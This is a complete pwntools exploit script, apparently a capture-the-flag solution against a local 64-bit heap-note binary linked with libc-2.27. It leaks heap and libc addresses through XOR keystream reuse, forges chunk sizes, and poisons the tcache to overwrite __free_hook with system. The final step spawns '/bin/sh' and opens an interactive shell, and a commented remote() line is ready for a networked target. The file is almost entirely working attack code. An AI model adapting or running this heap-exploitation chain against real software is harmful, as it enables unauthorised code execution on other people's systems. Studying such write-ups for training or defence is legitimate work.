#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = os.getenv('GDB_SALT') if (os.getenv('GDB_SALT')) else ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
# except Exception as e:
#     print(e)

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './main'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
sh = process(execve_file)
# sh = remote('', 0)
elf = ELF(execve_file)
libc = ELF('./libc-2.27.so')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    def pr
        x/12gx &notes
        end
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    pass

def create(index, content):
    sh.sendlineafter(': ', '0')
    sh.sendlineafter(': ', str(index))
    sh.sendafter('Content:\n', content)

def show(index):
    sh.sendlineafter(': ', '1')
    sh.sendlineafter(': ', str(index))

def delete(index):
    sh.sendlineafter(': ', '2')
    sh.sendlineafter(': ', str(index))


create(0, 'a' * 0x18)
create(1, '\0')
create(2, '\0')
show(0)
result = sh.recvuntil('\n.-----------------------.', drop=True)
partial_xor_stream1 = result
log.info('result: ' + hex(len(result)))

delete(2)
delete(1)
show(0)
result = sh.recvuntil('\n.-----------------------.', drop=True)
log.info('result: ' + hex(len(result)))
partial_xor_stream3 = result

content = ''
for i in range(8):
    content += chr(ord(partial_xor_stream1[0x20 + i]) ^ ord(result[0x20 + i]))

heap_addr = (u64(content) & 0xffffffffffffff00) - 0x200
log.success('heap_addr: ' + hex(heap_addr))
counter_addr = heap_addr + 0x260
log.success('counter_addr: ' + hex(counter_addr))

# modify size
while(True):
    try:
        create(1, 'b' * 0x18)
        show(0)
        result = sh.recvuntil('\n.-----------------------.', drop=True)

        size = (ord(partial_xor_stream1[0x38]) ^ 0x21) ^ ord(result[0x38])
        if(size == 0x31):
            break
        delete(1)
    except:
        delete(1)

create(2, '\0')
create(3, '\0')

delete(1)
show(0)
result = sh.recvuntil('\n.-----------------------.', drop=True)
log.info('result: ' + hex(len(result)))
partial_xor_stream4 = result
create(1, '\0')

delete(1)
delete(2)
delete(3)

# Partial covered
while(True):
    try:
        create(1, 'b' * 0x20)
        show(0)
        result = sh.recvuntil('\n.-----------------------.', drop=True)

        value = ord(partial_xor_stream1[0x60]) ^ ord(result[0x60])
        if(value == 0x60):
            break
        delete(1)
    except:
        delete(1)

delete(1)
create(2, '\0')
create(3, '\0')

create(1, 'b' * 0x28)

show(0)
result = sh.recvuntil('\n.-----------------------.', drop=True)
cipher_stream = ''

xor_stream_11 = partial_xor_stream3[:0x48] + partial_xor_stream4[0x48:0x60] + partial_xor_stream1[0x60:]

for i in range(0x28):
    if(i == 0x18):
        cipher_stream += chr(ord(xor_stream_11[i + 0x40]) ^ ord(result[i + 0x40]) ^ 0x21) # size
        continue
    
    cipher_stream += chr(ord(xor_stream_11[i + 0x40]) ^ ord(result[i + 0x40]))
log.success('cipher_stream: ')
print(hexdump(cipher_stream))

xor_stream_12 = ''
for i in range(0x28):
    xor_stream_12 += chr(ord(cipher_stream[i]) ^ ord('b'))
log.success('xor_stream_12: ')
print(hexdump(xor_stream_12))

expected_cipher_stream = 'g' * 0x18 + p64(0x41)
plain_stream = ''
for i in range(len(expected_cipher_stream)):
    plain_stream += chr(ord(expected_cipher_stream[i]) ^ ord(xor_stream_12[i]))
delete(3)
create(3, '\0')
delete(1)
create(1, plain_stream) 

delete(1)
delete(2)
create(1, 'a' * 0x3e0)
delete(1)
create(1, 'a' * 0xf0)
delete(1)
create(1, 'a' * 0x100)

delete(1)

expected_cipher_stream = 'g' * 0x18 + p64(0x511) + p64(0)
plain_stream = ''
for i in range(len(expected_cipher_stream)):
    plain_stream += chr(ord(expected_cipher_stream[i]) ^ ord(xor_stream_12[i]))
delete(3)
create(3, '\0')
create(1, plain_stream)

create(2, 't' * 0x37)
delete(2)

show(0)
result = sh.recvuntil('\n.-----------------------.', drop=True)
content = ''
for i in range(8):
    content += chr(ord(partial_xor_stream1[0x60 + i]) ^ ord(result[0x60 + i]))
libc_addr = u64(content) - 0x3ebca0
log.success('libc_addr: ' + hex(libc_addr))

create(2, 't' * 0x37)
delete(2)

expected_cipher_stream = 'g' * 0x18 + p64(0x41) + p64(libc_addr + libc.symbols['__free_hook'] - 8)
plain_stream = ''
for i in range(len(expected_cipher_stream)):
    plain_stream += chr(ord(expected_cipher_stream[i]) ^ ord(xor_stream_12[i]))
delete(3)
create(3, '\0')
delete(1)
create(1, plain_stream)

delete(1)
create(1, 'z' * 0x37)

expected_cipher_stream = '/bin/sh\0' + p64(libc_addr + libc.symbols['system'])
plain_stream = ''
for i in range(len(expected_cipher_stream)):
    plain_stream += chr(ord(expected_cipher_stream[i]) ^ ord(xor_stream_12[i]))
delete(3)
create(3, '\0')
create(2, plain_stream.ljust(0x37, 'z'))

delete(2)

sh.interactive()
clear()

